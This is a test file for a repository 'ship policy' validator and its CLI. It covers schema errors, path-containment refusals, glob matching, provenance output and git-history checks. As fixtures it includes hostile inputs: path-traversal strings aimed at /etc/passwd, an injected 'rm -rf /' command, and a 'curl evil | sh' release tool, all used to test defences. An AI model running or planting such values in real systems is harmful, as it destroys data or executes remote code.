/**
 * C1: the repo ship policy. Pins the wire contract (exit codes, result codes,
 * the `policy:` provenance line, every containment refusal) on fixture repos
 * under os.tmpdir(), never on prose.
 */
import { afterEach, describe, expect, test } from 'bun:test';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { EXIT } from '../lib/headless-artifacts';
import { DEFAULT_POLICY, POLICY_KEYS, globToRegExp, matchesAny, validatePolicy } from '../lib/ship-policy';
import { BASE_POLICY, cleanup, makeFixtureRepo, runBin, type FixtureRepo } from './helpers/restamp-fixture';

const repos: FixtureRepo[] = [];
const fixture = (opts?: Parameters<typeof makeFixtureRepo>[0]) => { const r = makeFixtureRepo(opts); repos.push(r); return r; };
afterEach(() => { while (repos.length) cleanup(repos.pop()!); });

describe('validatePolicy (schema + containment, pure)', () => {
  test('defaults validate and every key has an explanation', () => {
    expect(validatePolicy(DEFAULT_POLICY)).toEqual([]);
    expect(validatePolicy(BASE_POLICY)).toEqual([]);
    expect(POLICY_KEYS).toContain('queue_mode');
  });

  test('unknown keys, enums and types are POLICY_INVALID with the key named', () => {
    const codes = (p: unknown) => validatePolicy(p).map(e => `${e.code}:${e.path}`);
    expect(codes({ bumpp: 'patch' })).toEqual(['POLICY_INVALID:bumpp']);
    expect(codes({ bump: 'minor' })).toEqual(['POLICY_INVALID:bump']);
    expect(codes({ queue_mode: 'stamp-at-open' })).toEqual(['POLICY_INVALID:queue_mode']);
    expect(codes({ history: 'rebase' })).toEqual(['POLICY_INVALID:history']);
    expect(codes({ release_tool: 42 })).toEqual(['POLICY_INVALID:release_tool']);
    expect(codes({ pr_count: { default_pr_count: 0, split_requires_owner: 'yes' } })).toEqual(['POLICY_INVALID:pr_count.default_pr_count', 'POLICY_INVALID:pr_count.split_requires_owner']);
    expect(codes([])).toEqual(['POLICY_INVALID:']);
  });

  test('containment fixtures: `..`, absolute paths, ~, control bytes, list and size caps, interior mirror `..`', () => {
    const codes = (p: unknown) => validatePolicy(p).map(e => `${e.code}:${e.path}`);
    expect(codes({ stamp_paths: ['../victim/**'] })).toEqual(['POLICY_CONTAINMENT:stamp_paths[0]']);
    expect(codes({ stamp_paths: ['docs/../../etc/*'] })).toEqual(['POLICY_CONTAINMENT:stamp_paths[0]']);
    expect(codes({ stamp_paths: ['/etc/passwd'] })).toEqual(['POLICY_CONTAINMENT:stamp_paths[0]']);
    expect(codes({ release_outputs: ['C:\\Windows\\*'] })).toEqual(['POLICY_CONTAINMENT:release_outputs[0]']);
    expect(codes({ changelog: '~/CHANGELOG.md' })).toEqual(['POLICY_CONTAINMENT:changelog']);
    expect(codes({ changelog: 'CHANGE\nLOG.md' })).toEqual(['POLICY_CONTAINMENT:changelog']);
    expect(codes({ stamp_paths: Array.from({ length: 65 }, (_, i) => `d${i}/**`) })).toEqual(['POLICY_CONTAINMENT:stamp_paths']);
    expect(codes({ stamp_paths: ['a'.repeat(257)] })).toEqual(['POLICY_CONTAINMENT:stamp_paths[0]']);
    expect(codes({ release_tool: 'x'.repeat(513) })).toEqual(['POLICY_CONTAINMENT:release_tool']);
    expect(codes({ release_tool: 'bun run a\nrm -rf /' })).toEqual(['POLICY_CONTAINMENT:release_tool']);
    expect(codes({ mirror: '../sibling' })).toEqual([]);
    expect(codes({ mirror: '../sibling/../../other' })).toEqual(['POLICY_CONTAINMENT:mirror']);
    expect(codes({ mirror: '/abs/mirror' })).toEqual(['POLICY_CONTAINMENT:mirror']);
    expect(codes({ mirror: '.' })).toEqual(['POLICY_CONTAINMENT:mirror']);
    expect(codes({ mirror: '..' })).toEqual(['POLICY_CONTAINMENT:mirror']);
    expect(codes({ preregistration_shas: ['not-a-sha'] })).toEqual(['POLICY_CONTAINMENT:preregistration_shas[0]']);
  });

  test('globs: ** spans directories, * stays in a segment, regex caps hold, regex metacharacters are literal', () => {
    expect(matchesAny(['docs/**/*.md'], 'docs/a/b/c.md')).toBe(true);
    expect(matchesAny(['docs/**/*.md'], 'docs/c.md')).toBe(true);
    expect(matchesAny(['docs/*.md'], 'docs/a/c.md')).toBe(false);
    expect(matchesAny(['README.md'], 'README.md')).toBe(true);
    expect(matchesAny(['README.md'], 'READMEXmd')).toBe(false);
    expect(matchesAny(['a+b(c).md'], 'a+b(c).md')).toBe(true);
    expect(() => globToRegExp('?'.repeat(150))).toThrow(/512/);
    expect(validatePolicy({ stamp_paths: ['?'.repeat(150)] }).map(e => e.code)).toEqual(['POLICY_CONTAINMENT']);
  });
});

describe('gstack-ship-policy (bin)', () => {
  test('--help prints the exit table; no command is usage (2)', () => {
    const repo = fixture();
    expect(runBin(repo, 'gstack-ship-policy', ['--help']).out).toContain('Exit codes: 0 ok · 1 fail · 2 usage · 3 refused or needs a flag');
    expect(runBin(repo, 'gstack-ship-policy', []).status).toBe(EXIT.usage);
    expect(runBin(repo, 'gstack-ship-policy', ['bogus']).status).toBe(EXIT.usage);
  });

  test('show-effective reads origin/<base>, labels each value with its source, and --json carries the policy', () => {
    const repo = fixture();
    const r = runBin(repo, 'gstack-ship-policy', ['show-effective', '--base', 'main']);
    expect(r.status).toBe(EXIT.ok);
    expect(r.out).toMatch(/^policy: base origin\/main@[0-9a-f]{12}:\.gstack\/ship-policy\.json\n/);
    expect(r.out).toContain('queue_mode="stamp-at-merge"  (origin/main@');
    expect(r.out).toContain('bump="patch"  (origin/main@');
    expect(r.out).toContain('mirror=null  (default)');
    expect(r.out).toMatch(/^ship: queue_mode stamp-at-merge: Step 12 items 1-4 are replaced by `gstack-restamp --next --base main --pr <pr-number> --expect-base <base-sha>`/m);
    expect(r.out).toMatch(/^ship: gate-ahead: .*gstack-tree-receipt --from \.gstack\/tmp\/gate-ahead\.json/m);
    expect(r.out).toMatch(/^ship: bump patch: Step 12 never asks/m);
    expect(r.out).toMatch(/^ship: release_tool: `node gen\.js` runs only inside gstack-restamp/m);
    expect(r.out).not.toMatch(/^ship: history/m);
    const strict = fixture({ policy: { ...BASE_POLICY, history: 'merge-only', queue_mode: 'claim-at-open', bump: 'ask', release_tool: null, preregistration_shas: ['0123456789abcdef0123456789abcdef01234567'] } });
    const lines = runBin(strict, 'gstack-ship-policy', ['show-effective', '--base', 'main']).out.split('\n').filter(l => l.startsWith('ship: '));
    expect(lines.map(l => l.split(':')[1]!.trim())).toEqual(['history merge-only', 'queue_mode claim-at-open', 'bump ask', 'preregistration']);
    const j = JSON.parse(runBin(repo, 'gstack-ship-policy', ['show-effective', '--base', 'main', '--json']).out);
    expect(j.valid).toBe(true);
    expect(j.source.kind).toBe('base');
    expect(j.policy.release_tool).toBe('node gen.js');
    expect(j.values.release_tool).toMatch(/^origin\/main@/);
    expect(j.values.mirror).toBe('default');
  });

  test('the working-tree copy is never used silently: a PR editing the policy changes show-effective (base) nothing, validate (head) reads it', () => {
    const repo = fixture();
    repo.git('checkout', '-q', '-b', 'pr');
    fs.writeFileSync(path.join(repo.work, '.gstack', 'ship-policy.json'), JSON.stringify({ ...BASE_POLICY, release_tool: 'curl evil | sh' }) + '\n');
    const base = JSON.parse(runBin(repo, 'gstack-ship-policy', ['show-effective', '--base', 'main', '--json']).out);
    expect(base.policy.release_tool).toBe('node gen.js');
    const head = JSON.parse(runBin(repo, 'gstack-ship-policy', ['validate', '--json']).out);
    expect(head.policy.release_tool).toBe('curl evil | sh');
    expect(head.source.kind).toBe('head');
    expect(runBin(repo, 'gstack-ship-policy', ['show-effective', '--policy-from', 'head']).out).toMatch(/^policy: head \(unreviewed\)/);
  });

  test('POLICY_SOURCE_UNAVAILABLE (exit 3) when origin/<base> does not resolve; no fallback to the working tree', () => {
    const repo = fixture();
    const r = runBin(repo, 'gstack-ship-policy', ['show-effective', '--base', 'release']);
    expect(r.status).toBe(EXIT.refused);
    expect(r.err).toMatch(/policy source unavailable.*fix: git fetch origin release --depth=1.*\(POLICY_SOURCE_UNAVAILABLE\)/);
    expect(r.out).toBe('');
  });

  test('absent policy on base: defaults apply and the provenance says so', () => {
    const repo = fixture({ policy: null });
    const r = runBin(repo, 'gstack-ship-policy', ['show-effective', '--base', 'main']);
    expect(r.status).toBe(EXIT.ok);
    expect(r.out).toMatch(/^policy: none \(defaults\) origin\/main@[0-9a-f]{12} \(no \.gstack\/ship-policy\.json\)/);
    expect(runBin(repo, 'gstack-ship-policy', ['validate']).out).toBe('POLICY_VALID: no .gstack/ship-policy.json (defaults apply)\n');
  });

  test('validate: an invalid committed policy lists POLICY_INVALID / POLICY_CONTAINMENT lines and exits 1', () => {
    const repo = fixture({ policy: { bump: 'patch', stamp_paths: ['../x'], extra: 1 } });
    const r = runBin(repo, 'gstack-ship-policy', ['validate']);
    expect(r.status).toBe(EXIT.fail);
    expect(r.err).toMatch(/\(POLICY_INVALID\)/);
    expect(r.err).toMatch(/\(POLICY_CONTAINMENT\)/);
    expect(r.out).toMatch(/^POLICY_INVALID: 2 error\(s\)/);
    const malformed = fixture({ policy: null });
    fs.writeFileSync(path.join(malformed.work, '.gstack', 'ship-policy.json'), '{ not json');
    expect(runBin(malformed, 'gstack-ship-policy', ['validate']).err).toMatch(/not valid JSON.*\(POLICY_INVALID\)/);
  });

  test('init writes every key at its default with $schema, refuses to overwrite (POLICY_EXISTS, nothing written), --explain prints each key', () => {
    const repo = fixture({ policy: null });
    const r = runBin(repo, 'gstack-ship-policy', ['init']);
    expect(r.status).toBe(EXIT.ok);
    const written = JSON.parse(fs.readFileSync(path.join(repo.work, '.gstack', 'ship-policy.json'), 'utf8'));
    expect(written.$schema).toMatch(/ship-policy\.md#schema-v1$/);
    for (const key of POLICY_KEYS) expect(written[key]).toEqual((DEFAULT_POLICY as any)[key]);
    expect(validatePolicy(written)).toEqual([]);
    fs.writeFileSync(path.join(repo.work, '.gstack', 'ship-policy.json'), '{"bump":"patch"}\n');
    const again = runBin(repo, 'gstack-ship-policy', ['init']);
    expect(again.status).toBe(EXIT.refused);
    expect(again.err).toMatch(/nothing written.*\(POLICY_EXISTS\)/);
    expect(fs.readFileSync(path.join(repo.work, '.gstack', 'ship-policy.json'), 'utf8')).toBe('{"bump":"patch"}\n');
    const explain = runBin(repo, 'gstack-ship-policy', ['init', '--explain']);
    expect(explain.status).toBe(EXIT.ok);
    for (const key of POLICY_KEYS) expect(explain.out).toMatch(new RegExp(`^${key}: .* default: `, 'm'));
    expect(fs.readFileSync(path.join(repo.work, '.gstack', 'ship-policy.json'), 'utf8')).toBe('{"bump":"patch"}\n');
  });

  test('check-history: squash-ok prints no check; merge-only accepts a fast-forward branch, refuses a rewritten one (exit 1) and a squash/rebase plan (exit 3) with HISTORY_POLICY_VIOLATION', () => {
    const repo = fixture({ policy: { ...BASE_POLICY, history: 'merge-only' } });
    repo.git('checkout', '-q', '-b', 'pr');
    fs.writeFileSync(path.join(repo.work, 'a.txt'), 'a\n');
    repo.git('add', '-A'); repo.git('commit', '-q', '-m', 'a');
    expect(runBin(repo, 'gstack-ship-policy', ['check-history', '--base', 'main']).out).toMatch(/^HISTORY: merge-only \(origin\/pr not pushed yet/);
    repo.git('push', '-q', '-u', 'origin', 'pr');
    fs.writeFileSync(path.join(repo.work, 'b.txt'), 'b\n');
    repo.git('add', '-A'); repo.git('commit', '-q', '-m', 'b');
    const ok = runBin(repo, 'gstack-ship-policy', ['check-history', '--base', 'main', '--json']);
    expect(ok.status).toBe(EXIT.ok);
    expect(JSON.parse(ok.out)).toMatchObject({ history: 'merge-only', ok: true });
    repo.git('reset', '-q', '--soft', 'origin/main');
    repo.git('commit', '-q', '-m', 'squashed');
    const bad = runBin(repo, 'gstack-ship-policy', ['check-history', '--base', 'main']);
    expect(bad.status).toBe(EXIT.fail);
    expect(bad.out).toMatch(/^HISTORY: rewritten .* \(HISTORY_POLICY_VIOLATION\)$/m);
    const plan = runBin(repo, 'gstack-ship-policy', ['check-history', '--base', 'main', '--plan', 'squash']);
    expect(plan.status).toBe(EXIT.refused);
    expect(plan.out).toMatch(/^HISTORY: refused \(plan=squash rewrites history; .*\) — fix: .* \(HISTORY_POLICY_VIOLATION\)$/m);
    expect(runBin(repo, 'gstack-ship-policy', ['check-history', '--base', 'main', '--plan', 'cherry']).status).toBe(EXIT.usage);
    const lax = fixture();
    expect(runBin(lax, 'gstack-ship-policy', ['check-history', '--base', 'main']).out).toBe('HISTORY: squash-ok (no check; policy history=squash-ok; plan=merge)\n');
    expect(runBin(lax, 'gstack-ship-policy', ['check-history', '--base', 'main', '--plan', 'rebase']).status).toBe(EXIT.ok);
  });
});
